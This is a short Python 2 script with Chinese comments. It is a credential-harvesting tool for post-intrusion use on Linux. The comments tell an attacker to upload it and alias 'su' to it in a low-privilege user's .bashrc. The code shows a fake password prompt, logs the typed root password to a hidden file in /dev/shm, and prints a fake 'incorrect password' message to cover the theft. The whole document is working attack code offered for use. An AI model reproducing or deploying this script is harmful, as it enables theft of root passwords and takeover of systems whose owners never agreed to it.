#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, getpass, time

'''
渗透linux拿到低权限并提权无果时，为了获取su密码
将这个程序传上去，再将一个低权限用户目录下的.bashrc添加一句alias su='/usr/root.py'.
低权限用户su root 后 成功记录密码。密码记录路径请看脚本

使用时应根据实际情况修改prompt和出错时的提示词
'''


current_time = time.strftime("%Y-%m-%d %H:%M")
logfile = "/dev/shm/.su.log"  # 密码获取后记录在这里
# CentOS
# fail_str = "su: incorrect password"
# Ubuntu
# fail_str = "su: Authentication failure"
# For Linux Korea                    //centos,ubuntu,korea 切换root用户失败提示不一样
fail_str = "su: incorrect password"
try:
    passwd = getpass.getpass(prompt='Password: ')
    file = open(logfile, 'a')
    file.write("[%s]t%s" % (passwd, current_time))  # 截取root密码
    file.write('n')
    file.close()
except:
    pass
time.sleep(1)
print fail_str  # 打印切换root失败提示
